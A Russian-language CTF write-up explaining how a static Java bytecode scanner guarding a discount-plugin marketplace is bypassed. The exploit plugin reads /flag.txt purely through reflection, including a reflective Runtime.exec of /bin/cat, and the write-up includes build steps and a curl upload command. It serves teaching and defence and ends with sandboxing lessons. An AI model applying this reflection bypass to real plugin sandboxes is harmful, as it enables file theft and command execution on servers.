# B2Bee — райтап

**Флаг:** `avito{juSt_34Sy_biG_DISCoUNt}`
**Класс:** Java sandbox escape (static bytecode review bypass) · **Сложность:** н/д ·
**Очки:** н/д · **Решило команд:** н/д
**Автор:** н/д (метаданные платформы по этой задаче не сохранены)

**Суть решения в одном абзаце.** Сервис пропускает пользовательские Java-плагины через
статический ASM-сканер байткода («ревью-пчела»), который смотрит только на *owner* каждой
инструкции (по грубому префиксу `java/lang`, вайтлистящему заодно и `java/lang/reflect/*`) и
никогда — на обычные строковые константы или поток данных. Плагин, который читает `/flag.txt`
**исключительно через рефлексию** (`Class.forName(...).getMethod(...).invoke(...)`), держа опасные
имена классов и путь как строки, физически невидим для такого сканера, но в рантайме читает файл
как обычно.

---

## 1. Задача

Сайт — «магазин плагинов скидок». Форма загрузки принимает `.jar`-файл и имя точки входа, прогоняет
плагин на тестовой корзине товаров, отдаёт `result.message` в UI. Перед запуском стоит статический
сканер байткода — «ревью-пчела»; его исходники (`PluginScanner.java`, `SandboxPolicy.java`) выложены
в открытую. **Цель:** провести вредоносный плагин через это ревью и прочитать `/flag.txt` на сервере.

**Дано:** исходники сканера `PluginScanner.java` + `SandboxPolicy.java`; боевой хост
`https://marketplugins-4qop8u5n.avitoctf.ru/`.

## 2. Разведка

Логика фронта (`app.js`, `site_index.html`) устроена так:

- есть каталог `GET /api/shop` и «тестовая корзина» — набор товаров, на котором прогоняется плагин;
- форма загрузки принимает `.jar`-файл (поле `plugin`) и имя точки входа (поле `entryClass`, по
  умолчанию `example.SeasonalDiscountPlugin`);
- сабмит уходит в `POST /api/plugins/run` (multipart), а ответ рендерится: при успехе поле
  `result.message` показывается в блоке «Сообщение плагина» внутри `<pre>`, при отказе — плашка
  «JAR отправлен в карантин» с `category` и `message` от сканера;
- рядом лежит `/examples/plugin-example.zip` — официальный SDK: `plugin-api-stubs.jar` (заглушки
  API) и `build-plugin.sh`, который собирает пример командой
  `javac --release 21 -XDstringConcat=inline`.

Ключевое наблюдение: между загрузкой и запуском стоит статический сканер байткода. Раз у нас есть
**точный код проверяющего**, задача — не пробить рантайм, а разобрать сканер дословно и найти, что
он *не* моделирует. Что не проверяется — то и есть путь эксплуатации.

## 3. Как мы вышли на решение (логика гипотез)

- **Наблюдение.** `PluginScanner` строит `ClassNode` (ASM, `ClassReader.SKIP_DEBUG`) и смотрит ровно
  на: `node.superName`/`node.interfaces`, у каждой инструкции — **только owner**
  (`MethodInsnNode.owner`, `FieldInsnNode.owner`, а для `TypeInsnNode` — `desc` при
  `NEW`/`ANEWARRAY`/`CHECKCAST`), и константы `LDC` через `inspectConstant`.
  **Гипотеза** — если сканер оперирует только *owner*-ами инструкций, то любой вызов, чей owner
  разрешён, пройдёт независимо от того, какие данные через него текут. Значит нужно искать owner,
  который одновременно (а) разрешён политикой и (б) достаточно мощный, чтобы им можно было вызвать
  что угодно динамически.

- **Проверка.** `inspectConstant` блокирует лишь `ConstantDynamic`, `Handle` и `Type` сорта `METHOD`
  — **обычные строковые `String`-константы игнорируются полностью**. Значит имя опасного класса
  можно передавать как строку, и сканер её не увидит как «опасность».

- **Наблюдение (в `SandboxPolicy.checkOwner`).**
  ```java
  ALLOWED = { "java/lang", "java/util", "java/math", "java/time",
              "ru/avitoctf/marketplugins/api", "ru/avitoctf/marketplugins/model" };
  DENIED  = { "java/lang/Runtime", "java/lang/Process", "java/lang/ProcessBuilder",
              "java/lang/ProcessHandle", "java/lang/System", "java/lang/Thread",
              "java/lang/ClassLoader", "java/lang/SecurityManager", "java/nio/file",
              "ru/avitoctf/marketplugins/sandbox", ".../service", ".../web" };
  ```
  Проверка идёт по префиксу (`startsWith`). **Гипотеза, ставшая ключевой находкой:** аллоу-лист
  `"java/lang"` — это префикс, который вайтлистит **весь** `java/lang/reflect/*` и `java/lang/Class`,
  а в `DENIED` их нет. Значит `Class.forName(...)` (owner `java/lang/Class`) и `Method.invoke(...)`
  (owner `java/lang/reflect/Method`) — легальны сами по себе, а конкретное имя класса, которое им
  передают (`"java.lang.Runtime"`, `"java.nio.file.Files"`), сканер вообще не смотрит (см. пункт
  выше про `inspectConstant`).

- **Проверка гипотезы на минимальном примере.** Написан пробный класс, который делает
  `Class.forName("java.lang.Runtime")` и через рефлексию вызывает `exec`. Прогнан через **тот же**
  `PluginScanner` локально (harness `Verify.java`, компилирующий реальные `PluginScanner.java` +
  `SandboxPolicy.java` с хоста) → `SCAN PASSED`. Гипотеза подтвердилась: рефлексия действительно
  проходит сканер незамеченной.

- **Тупик №1 — наивная строковая конкатенация.** Первая версия пейлоада строила пути через `"a" + b`.
  Современный `javac` (Java 9+) компилирует такую конкатенацию в `invokedynamic`
  (`StringConcatFactory`), а сканер **безусловно** банит любой `InvokeDynamicInsnNode`. Прогон через
  `Verify.java` сразу показал `SCAN BLOCKED`. **Исправление:** явная сборка строк через
  `StringBuilder` (никогда `+`) плюс компиляция с флагом `-XDstringConcat=inline`, который убирает
  `invokedynamic`-конкатенацию даже там, где она могла бы проскочить.

- **Дополнительная находка при чтении `checkOwner`.** `if (!owner.contains("/")) return;` —
  owner без слэша (дескрипторы примитивных массивов вроде `"[B"`, классы дефолтного пакета)
  **автоматически пропускается**. Замечено на примере `CHECKCAST` с desc `"[B"` при приведении
  `Object` к `byte[]` после рефлексивного чтения файла — ещё одна щель, которую не нужно было даже
  специально эксплуатировать, она просто не мешала.

- **Негативный контроль (проверка, что харнесс не пропускает всё подряд).** Прогнан заведомо
  палевный плагин с прямым `Runtime.getRuntime().exec(...)` (owner `java/lang/Runtime` напрямую) и
  `+`-конкатенацией → `Verify.java` вернул `SCAN BLOCKED [blocked-direct-call]`. Это подтвердило, что
  сканер реально работает и не является пустой заглушкой — обход именно **точечный**, через
  рефлексию, а не «сканер вообще ничего не ловит».

## 4. Уязвимость

`PluginScanner` — чисто синтаксический ASM-сканер без анализа потока данных:

1. Грубый префикс `ALLOWED "java/lang"` пропускает весь `java/lang/reflect/*` и `java/lang/Class`.
2. В `DENIED` нет ни `java/lang/Class`, ни `java/lang/reflect/*`.
3. `inspectConstant` не смотрит на обычные `String` — имена классов/методов/путей проходят
   невидимками.
4. Нет анализа потока данных — связь «строка → `Class.forName`» не отслеживается.
5. `if (!owner.contains("/")) return;` — авто-пропуск любого owner без слэша.
6. `pluginOwners.contains(binaryName)` — само-доверие к собственным классам плагина.

Единственная реальная защита — бан `INVOKEDYNAMIC` и `Handle`/`MethodType`/`ConstantDynamic`. Она не
мешает рефлексии, а лишь запрещает лямбды, method-ref и `invokedynamic`-конкатенацию строк.

## 5. Эксплойт по шагам

### 5.1. Пейлоад

Плагин реализует легальный интерфейс `ru.avitoctf.marketplugins.api.DiscountPlugin` (метод
`PluginResult apply(PluginContext)`), а в теле **чистой рефлексией** читает флаг и кладёт его в
`message` результата, который UI отрендерит в `<pre>`:

```java
public PluginResult apply(PluginContext context) throws Exception {
    String flag = grab();
    return new PluginResult(1337, 4242, flag); // message -> блок «Сообщение плагина»
}
```

`grab()` перебирает 5 путей-кандидатов (`/flag.txt`, `flag.txt`, `/flag`, `/app/flag.txt`,
`/home/app/flag.txt`) тремя стратегиями чтения — на случай, если один способ закрыт. Все три
написаны только через рефлексию:

```java
// Стратегия 1: java.nio.file.Files.readAllBytes(Paths.get(path))
Class<?> paths = Class.forName("java.nio.file.Paths");   // owner java/lang/Class, аргумент — String
Class<?> pathType = Class.forName("java.nio.file.Path");
Class<?> files = Class.forName("java.nio.file.Files");
Object pathObj = paths.getMethod("get", String.class, String[].class).invoke(null, path, new String[0]);
Object bytes = files.getMethod("readAllBytes", pathType).invoke(null, pathObj);
return new String((byte[]) bytes);
```

Плюс стратегия 2 — рефлексивный `java.io.FileInputStream(path).readAllBytes()`, и стратегия 3 —
рефлексивный `Runtime.getRuntime().exec({"/bin/cat", path})`. Все объекты, которые иначе притянули
бы запрещённый owner (`java/io/*`, `java/nio/*`, `java/lang/Runtime`), держатся как
`java.lang.Object` и трогаются только через `Method.invoke`.

### 5.2. Обход бана invokedynamic

- ноль лямбд и method-ref;
- все строки собираются явным `StringBuilder`, никогда оператором `+`;
- сборка с флагом `-XDstringConcat=inline`.

### 5.3. Сборка и локальная верификация

`task6/exploit/build.sh` собирает JAR и **прогоняет его через настоящий сканер** (те же
`PluginScanner.java` + `SandboxPolicy.java` с боевого хоста), воспроизводя ровно то, что делает
сервер:

```bash
cd task6/exploit && bash build.sh
```

Шаги внутри:
```
[1] javac --release 21 -XDstringConcat=inline -cp plugin-api-stubs.jar ...   # компиляция плагина
[2] jar cf seasonal-discount-plugin.jar ...                                  # упаковка + проверка,
    что классы политики НЕ вложены в JAR
[3] javap -c -p ... | grep invokedynamic   -> 0 совпадений
[4] javac ... PluginScanner.java SandboxPolicy.java + стабы + Verify.java     # компиляция РЕАЛЬНОГО сканера
[5] java Verify seasonal-discount-plugin.jar                                 # запуск scan() как на сервере
```
Результаты прогона: собранный JAR → `RESULT: SCAN PASSED`; `javap -c` → 0 invokedynamic;
негативный контроль (наивный плагин) → `SCAN BLOCKED [blocked-direct-call]`.

### 5.4. Загрузка на боевой хост

```bash
curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
  -F "plugin=@task6/exploit/build/dist/seasonal-discount-plugin.jar;type=application/java-archive" \
  -F "entryClass=example.SeasonalDiscountPlugin" \
  -F 'cart={"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
```

Флаг возвращается в `result.message`. Важно: **корзина не должна быть пустой** — иначе фронт вернёт
«Сначала добавьте товары в корзину», и плагин не запустится.

Воспроизведение целиком (сборка + локальная верификация + загрузка) — `task6/solve_task6.py`
(см. §8).

## 6. Флаг

```
avito{juSt_34Sy_biG_DISCoUNt}
```

Содержимое `/flag.txt`, полученное загрузкой плагина-эксплойта: JAR прошёл статический сканер, а в
рантайме рефлексия прочитала файл и вернула его в `result.message`.

### Бонус: отсылка для своих (Unicode-Tag стего)

В тексте одного из исключений `PluginScanner.java` (ветка `ConstantDynamic`/`Handle`) спрятаны
невидимые Unicode-Tag символы (`U+E01xx`, `ASCII = codepoint − 0xE00F0`), декодирующиеся в
`good job, take your hidden flag: https://marketdone-cgttbdfl.avitoctf.ru/` — бонус-хост с отдельным
пошаговым квестом, к флагу этой задачи отношения не имеет.

## 7. Выводы

1. **Статический аллоу/деной-лист по префиксам owner'ов — это не песочница.** Рефлексия
   (`Class.forName` + `Method.invoke`) прячет любой класс за строкой и разрешённым owner'ом
   `java/lang/Class` / `java/lang/reflect/*`, а сканер без анализа потока данных этого не видит.
2. **Грубые префиксы опасны:** `"java/lang"` тянет за собой `java/lang/reflect/*`; авто-пропуск
   owner'ов без слэша открывает дыру для дескрипторов массивов и дефолт-пакета.
3. **Методология решения:** взять исходник проверяющего → перечислить, что он *не* моделирует
   (строки, поток данных, рефлексия) → собрать пейлоад строго в рамках разрешённых owner'ов →
   **прогнать через тот же сканер локально** до отправки на сервер, включая негативный контроль,
   чтобы не спутать «сканер не работает» с «сканер обойдён точечно».
4. **Как надо было изолировать:** отдельный процесс/JVM с seccomp, `ClassLoader` с фильтром классов
   и модульные границы, запрет рефлексии в песочнице — а не разбор байткода allow/deny-списком.

## 8. Артефакты

- `task6/solve_task6.py` — curated-скрипт-оркестратор: собирает плагин и прогоняет его через
  настоящий сканер локально (`exploit/build.sh`, требует JDK 21 на `PATH`), затем загружает
  верифицированный JAR на боевой хост через `POST /api/plugins/run` и печатает флаг из
  `result.message`. ruff+ty чисто.
- `task6/exploit/src/example/SeasonalDiscountPlugin.java` — исходник эксплойт-плагина.
- `task6/exploit/build.sh`, `task6/exploit/harness/Verify.java` — локальный харнесс, повторяющий
  серверную проверку `PluginScanner.scan(...)`.
- `task6/marketplugins/PluginScanner.java`, `task6/marketplugins/SandboxPolicy.java` — исходники
  проверяющего (выданы условием задачи).
